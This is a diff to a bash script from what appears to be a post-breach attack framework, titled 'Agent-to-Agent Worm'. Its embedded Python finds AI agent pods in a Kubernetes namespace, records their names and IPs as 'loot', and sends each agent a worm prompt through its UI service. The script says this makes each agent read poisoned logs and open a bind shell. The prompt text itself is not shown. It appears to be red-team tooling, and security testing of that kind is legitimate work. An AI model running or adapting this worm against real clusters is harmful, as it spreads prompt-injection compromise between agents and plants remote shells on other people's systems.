@@ -23,9 +23,11 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib.sh"
 
 banner "Post-Breach: Agent-to-Agent Worm"
+echo "@PHASE Agent-Worm"
 
 PYTHON_CODE="${K8S_API_PREAMBLE}
 
+print('@PHASE Pod-Discovery')
 print('=' * 60)
 print('  AI WORM: Agent-to-Agent Propagation')
 print('=' * 60)
@@ -46,7 +48,12 @@ except Exception:
 
 items = pods.get('items', [])
 print(f'  Found {len(items)} Neo pod(s) in {agent_ns}')
-print(f'  My IP: {my_ip or \"unknown\"}')
+print(f'  My IP: {my_ip or "unknown"}')
+print(f'@FINDING info {len(items)} Neo pods discovered in {agent_ns}')
+for pod_item in items:
+    pn = pod_item['metadata']['name']
+    pi = pod_item.get('status', {}).get('podIP', '')
+    print(f'@LOOT pod-list {pn}={pi}')
 print()
 
 worm_prompt = (
@@ -67,8 +74,8 @@ for pod in items:
         continue
 
     print(f'  [{pod_name}] {pod_ip}')
+    print(f'@PHASE Infect-{pod_name}')
 
-    # Try to find the relay service for this pod
     # POST the worm prompt to make the agent read poisoned logs
     neo_ui_host = f'neo-ui.{agent_ns}.svc'
     try:
@@ -81,6 +88,8 @@ for pod in items:
         print(f'    Prompt sent: HTTP {resp.status}')
         resp.read()
         infected += 1
+        print(f'@FINDING critical Worm payload delivered to {pod_name} ({pod_ip})')
+        print(f'@LOOT worm-results infected:{pod_name}')
     except Exception as e:
         print(f'    Failed to send prompt: {type(e).__name__}: {e}')
 
@@ -88,6 +97,7 @@ print()
 print(f'  Worm payload sent to {infected} agent(s).')
 print('  Each agent will read poisoned logs and open a bind shell.')
 print()
+print(f'@RESULT success Worm payload sent to {infected} agent(s)')
 print('Agent worm propagation complete.')
 "
 
